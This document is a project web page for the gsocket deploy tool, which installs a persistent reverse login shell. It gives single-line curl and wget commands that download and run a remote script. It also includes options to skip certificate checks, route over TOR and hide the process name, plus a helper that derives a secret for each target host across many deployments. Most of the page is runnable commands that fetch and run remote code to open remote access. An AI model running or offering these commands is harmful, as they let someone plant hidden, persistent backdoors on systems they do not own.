---
layout: default
---

<p class="panel-note2" markdown="1">Deploy a reverse login shell with a *single command* (fully automated) - and access the shell remotely - encrypted - and via TOR if you like.</p>

> _This must be the quickest way to access a system_ -- anonymous

Use either one of these two commands to _install_, _uninstall_, and _access_:

<!-- This is obviously the tabs wrapper -->
<div class="tabs-wrapper">
    <!-- And here the tabs container -->
    <div class="tabs">
        <!-- This is the first tab -->
        <div class="tab">
            <!-- "checked" means active tab -->
            <input type="radio" name="css-tabs-init" id="curl-init" class="tab-switch" checked>
            <!-- This is the tab selector -->
            <label for="curl-init" class="tab-label">Curl</label>
            <!-- This is the tab content container -->
            <div class="tab-content">
                <ul>
                    <li><p><strong>Install</strong></p>
<!--
This is how to reproduce the syntax highlighting with "rouge"
You must respect this weird placement to avoid extra rendered space
See here for more details:
https://jekyllrb.com/docs/liquid/tags/#code-snippet-highlighting
-->
{% highlight shell %}
bash -c "$(curl -fsSL gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Uninstall</strong></p>
{% highlight shell %}
GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Access</strong></p>
{% highlight shell %}
S="ExampleSecretChangeMe" bash -c "$(curl -fsSL gsocket.io/x)"
{% endhighlight %}
                    </li>
                </ul>
            </div>
        </div>
        <!-- This is the second tab -->
        <div class="tab">
            <input type="radio" name="css-tabs-init" id="wget-init" class="tab-switch">
            <label for="wget-init" class="tab-label">Wget</label>
            <div class="tab-content">
                <ul>
                    <li><p><strong>Install</strong></p>
{% highlight shell %}
bash -c "$(wget --no-verbose -O- gsocket.io/x)"
{% endhighlight %}
                    </li>
                </ul>
                <ul>
                    <li><p><strong>Uninstall</strong></p>
{% highlight shell %}
GS_UNDO=1 bash -c "$(wget --no-verbose -O- gsocket.io/x)"
{% endhighlight %}
                    </li>
                </ul>
                <ul>
                    <li><p><strong>Access</strong></p>
{% highlight shell %}
S="ExampleSecretChangeMe" bash -c "$(wget --no-verbose -O- gsocket.io/x)"
{% endhighlight %}
                    </li>
                </ul>
            </div>
        </div>
    </div>
</div>

<p class="panel-note2" markdown="1">This is just one of many GSOCKET examples. More on [GitHub]({{site.github.repository_url}}).</p>

{:refdef: style="text-align: center;"}
## Screenshots
{: refdef}
Deploy on a host
{:refdef: style="text-align: center;"}
![Deploy-Example](../assets/images/deploy-example.png)
{: refdef}
Log in to the host from your workstation
{:refdef: style="text-align: center;"}
![Deploy-Login](../assets/images/deploy-login.png)
{: refdef}

{:refdef: style="text-align: center;"}
## Tips & Tricks
{: refdef}

<div class="tabs-wrapper">
    <div class="tabs" style="height: 25.45rem;">
        <div class="tab">
            <input type="radio" name="css-tabs-tricks" id="curl-tricks" class="tab-switch" checked>
            <label for="curl-tricks" class="tab-label">Curl</label>
            <div class="tab-content" style="height: 23.5rem;">
                <ul>
                    <li><p><strong>Ignore SSL / Certificate warnings</strong></p>
{% highlight shell %}
bash -c "$(curl -fsSLk gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Deploy with a predefined secret</strong></p>
{% highlight shell %}
X=ExampleSecretChangeMe bash -c "$(curl -fsSL gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Deploy from self-extracting shell-script <a href="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh" target="_blank">deploy-all.sh</a> without fetching any packages and using good old plain HTTP</strong></p>
{% highlight shell %}
curl -fsSL http://nossl.segfault.net/deploy-all.sh && \
bash ./deploy-all.sh
{% endhighlight %}
                    </li>
                </ul>
            </div>
        </div>
        <div class="tab">
            <input type="radio" name="css-tabs-tricks" id="wget-tricks" class="tab-switch">
            <label for="wget-tricks" class="tab-label">Wget</label>
            <div class="tab-content" style="height: 23.5rem;">
                <ul>
                    <li><p><strong>Ignore SSL / Certificate warnings</strong></p>
{% highlight shell %}
bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Deploy with a predefined secret</strong></p>
{% highlight shell %}
X=ExampleSecretChangeMe bash -c "$(wget --no-verbose -O- gsocket.io/x)"
{% endhighlight %}
                    </li>
                    <li><p><strong>Deploy from self-extracting shell-script <a href="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh" target="_blank">deploy-all.sh</a> without fetching any packages and using good old plain HTTP</strong></p>
{% highlight shell %}
wget --no-hsts http://nossl.segfault.net/deploy-all.sh && \
bash ./deploy-all.sh
{% endhighlight %}
                    </li>
                </ul>
            </div>
        </div>
    </div>
</div>

Useful environment variables:  

|:---|:---|
|S=|Connect to a system (or use `gs-netcat -s <secret> -il`).|
|X=|Set a predefined secret for the installation (X like in inXstallation).|
|GS_NOINST=1|Only start but without installing (will not survive a reboot).|
|GSOCKET_ARGS=|Use additonal arguments. Most often used to force TOR in combination with S=, e.g. `GSOCKET_ARGS="-T" S=<secret> bash -c "$(curl -fsSLk gsocket.io/x)`.|
|GS_DSTDIR=|Set the installation directory. The default is to pick the most suitable automatically. Use `find . -type d -writable`. |
|GS_URL_BASE=|Use URL for static binaries. The default is https://github.com/hackerschoice/binary/raw/main/gsocket/bin/.|
|GS_OSARCH=|Force architecture. The default is to pick the most suitable automatically.
|GS_DEBUG=1|Verbose output and other debug related settings. Often used together with `GS_DEBUG=1 GS_NOSTART=1 GS_NOINST=1 bash -c "$(curl -fsSL gsocket.io/x)"`.|
|GS_HIDDEN_NAME=|Use a custom hidden process name.|
|TMPDIR=|Use a custom temporary directory. Try TMPDIR=$(pwd)|

If all fails:

Download the static binary from [https://github.com/hackerschoice/binary/tree/main/gsocket/bin](https://github.com/hackerschoice/binary/tree/main/gsocket/bin) (likely [gs-netcat_x86_64-alpine.tar.gz](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz)) and extract and start gs-netcat manually:

<div class="tabs-wrapper">
    <div class="tabs" style="height: 12.45rem;">
        <div class="tab">
            <input type="radio" name="css-tabs-manual" id="curl-manual" class="tab-switch" checked>
            <label for="curl-manual" class="tab-label">Curl</label>
            <div class="tab-content" style="height: 10.5rem; padding-left: 1.2em;">
{% highlight shell %}
curl -fsSL https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
SECRET=$(/bin/gs-netcat -g)
GSOCKET_ARGS="-liD -s $SECRET" /bin/gs-netcat
echo "Connect with: gs-netcat -s $SECRET -i" 
{% endhighlight %}
            </div>
        </div>
        <div class="tab">
            <input type="radio" name="css-tabs-manual" id="wget-manual" class="tab-switch">
            <label for="wget-manual" class="tab-label">Wget</label>
            <div class="tab-content" style="height: 10.5rem; padding-left: 1.2em;">
{% highlight shell %}
wget --no-check-certificate -qO- https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
SECRET=$(/bin/gs-netcat -g)
GSOCKET_ARGS="-liD -s $SECRET" /bin/gs-netcat
echo "Connect with: gs-netcat -s $SECRET -i" 
{% endhighlight %}
            </div>
        </div>
    </div>
</div>

{:refdef: style="text-align: center;"}
## Advanced Tips & Tricks
{: refdef}

Remembering many secrets from many deployments is cumbersome. It is easier to remember just one MASTER-SEED and derive the SECRET from the target's hostname. The following script generates a secure SECRET based on a single MASTER-SEED and the target's hostname.

<div class="tabs-wrapper">
    <div class="tabs" style="height: 35.45rem;">
        <div class="tab">
            <input type="radio" name="css-tabs-advanced" id="curl-advanced" class="tab-switch" checked>
            <label for="curl-advanced" class="tab-label">Curl</label>
            <div class="tab-content" style="height: 33.5rem; padding-left: 1.2em;">
{% highlight sh %}
# cut & paste this into your shell on your workstation or add to ~/.bashrc
gssec()
{
    str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
    str="${str:0:22}"
    echo "DEPLOY: X=${str}"' bash -c "$(curl -fsSL gsocket.io/x)"'
    echo "ACCESS: S=${str}"' bash -c "$(curl -fsSL gsocket.io/x)"'
    echo "ACCESS: gs-netcat -s ${str} -i"
}

# Pick a STRONG master seed:
[[ -z $GS_SEED ]] && GS_SEED=MySuperStrongMasterSeed
{% endhighlight %}
{% highlight sh %}
# Generate a SECRET based on the SEED and 'alice.com'
$ gssec alice.com # You only need to know "alice.com" to connect.

# Output from above's command:
DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL gsocket.io/x)"
ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL gsocket.io/x)"
ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
{% endhighlight %}
            </div>
        </div>
        <div class="tab">
            <input type="radio" name="css-tabs-advanced" id="wget-advanced" class="tab-switch">
            <label for="wget-advanced" class="tab-label">Wget</label>
            <div class="tab-content" style="height: 33.5rem; padding-left: 1.2em;">
{% highlight sh %}
# cut & paste this into your shell on your workstation or add to ~/.bashrc
gssec()
{
    str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
    str="${str:0:22}"
    echo "DEPLOY: X=${str}"' bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"'
    echo "ACCESS: S=${str}"' bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"'
    echo "ACCESS: gs-netcat -s ${str} -i"
}

# Pick a STRONG master seed:
[[ -z $GS_SEED ]] && GS_SEED=MySuperStrongMasterSeed
{% endhighlight %}
{% highlight sh %}
# Generate a SECRET based on the SEED and 'alice.com'
$ gssec alice.com # You only need to know "alice.com" to connect.

# Output from above's command:
DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
{% endhighlight %}
            </div>
        </div>
    </div>
</div>

<p class="panel-note" markdown="1">Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).</p>

<!-- Adding some 'magic' over tabs ;) -->
<script>
(() => {
    const tabsSelector = 'input.tab-switch';
    const tabsDebug = false;
    document.querySelectorAll(tabsSelector).forEach((el) => {
        const id = el.id;
        const type = id.split('-')[0];
        if (tabsDebug === true) {
            console.log('[change] event listener attached on', id, '- type:', type);
        }
        el.addEventListener('change', (event) => {
            if (tabsDebug === true) {
                console.log('Change event triggered.', event);
            }
            let targetTabs = String(event.target.id).includes(type) ? type : 'undefined';
            if (tabsDebug === true) {
                console.log(`Should select other [${targetTabs}] tabs.`);
            }
            document.querySelectorAll(tabsSelector).forEach((target) => {
                if (String(target.id).includes(targetTabs) && !target.checked) {
                    target.checked = true;
                }
            });
        });
    });
})();
</script>